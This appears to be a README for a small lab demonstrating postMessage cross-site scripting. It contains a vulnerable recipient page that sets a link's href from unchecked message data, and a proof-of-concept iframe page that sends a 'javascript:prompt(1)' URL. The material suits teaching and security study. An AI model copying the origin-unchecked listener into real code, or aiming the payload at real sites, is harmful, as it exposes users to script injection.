# postMessage-exploits

## What is a postMessage?

From Mozilla:

- The window.postMessage() method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it.


## Example 1
*works in firefox by default  
for chrome to work change the postMessageExploit.html page code to this*

```
	setTimeout(function(){
	let msg={url : "javascript:prompt(1)"};
	var iFrame = document.getElementById("frame")
	iFrame.contentWindow.postMessage(msg, '*');
}, 2000);
```

### website 1

This page is a basic exmaple with 2 buttons.  
button1 opens the webpage in a new child window  
button2 sends a normal post message call to update a url on the page

<details>
	<summary>Website 1 source code</summary>
	
	
	
	
	<!DOCTYPE html>
	<html>
	<head>
	    <title>Website 1</title>
	 <meta charset="utf-8" />
	<script>

	var child;
	function openChild() {child = window.open('website2.html', 'popup', 'height=300px, width=500px');

	}
	function sendMessage(){
	    let msg={url : "changed.html"};
	    // In production, DO NOT use '*', use toe target domain
	    child.postMessage(msg,'*')// child is the targetWindow
	    child.focus();
	}</script>
	</head>
	<body>
	    <form>
		<fieldset>
		    <input type='button' id='btnopen' value='Open child' onclick='openChild();' />
		    <input type='button' id='btnSendMsg' value='Send Message' onclick='sendMessage();' />
		</fieldset>
	    </form>
	</body>
	</html>	
	
	
</details>

### website 2

This page is the testpage (vunerable webpage), It takes a postmessage with parameters (msg, "\*")  
It will change the URL after button 2 is cliked on website 1

<details>
  <summary>Website 2 source code</summary>
	
	
	<!DOCTYPE html>
	<html>
	<head>
	    <title>Website 2</title>
	    <meta charset="utf-8" />
	    <script>
	    // Allow window to listen for a postMessage
	    window.addEventListener("message", (event)=>{
		// Normally you would check event.origin
		// To verify the targetOrigin matches
		// this window's domain
		 document.getElementById("redirection").href=`${event.data.url}`;
		// event.data contains the message sent

	    });function closeMe() {
		try {window.close();
		} catch (e) { console.log(e) }
		try {self.close();
		} catch (e) { console.log(e) }}
	    </script>
	</head>
	<body>
	    <form>
		<h1>Recipient of postMessage</h1>
		    <fieldset>
			<a type='text' id='redirection' href=''>Go back</a>
			<input type='button' id='btnCloseMe' value='Close me' onclick='closeMe();' />
		    </fieldset>

	    </form>
	</body>
	</html>
	
	
</details>

### postmessageexploit

This page will load our postmessage and when you click go back, a prompt box will appear

<details>
  <summary>postMessageExploit source code</summary>
	
	
	<!DOCTYPE html>
	<html>
	<head>
	    <title>XSS PoC</title>
	 <meta charset="utf-8" />
	</head>
	<body>

	 <iframe id="frame" src="website2.html" ></iframe>

	 <script>
		setTimeout(function(){
		let msg={url : "javascript:prompt(1)"};
		var iFrame = document.getElementById("frame")
		iFrame.contentWindow.postMessage(msg, '*');
	}, 2000);

	</script>
	</body>
	</html>
	
	
</details>
